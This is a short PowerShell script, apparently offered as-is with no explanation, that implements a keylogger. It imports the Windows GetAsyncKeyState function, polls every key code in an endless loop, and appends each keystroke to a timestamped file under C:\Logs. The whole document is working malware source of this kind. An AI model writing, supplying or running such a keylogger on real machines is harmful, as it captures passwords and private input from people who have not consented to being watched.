Add-Type @"
using System;
using System.Runtime.InteropServices;
public class KeyLogger {
  [DllImport("user32.dll")]
  public static extern short GetAsyncKeyState(int vKey);
}
"@

$logDir = 'C:\Logs'
if (-not (Test-Path $logDir)) { New-Item -ItemType Directory -Path $logDir | Out-Null }
$timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'
$logFile = Join-Path $logDir "keys_$timestamp.txt"

while ($true) {
  Start-Sleep -Milliseconds 100
  foreach ($code in 1..255) {
    if ([KeyLogger]::GetAsyncKeyState($code) -eq -32767) {
      $char = [char]$code
      Add-Content $logFile $char
    }
  }
}
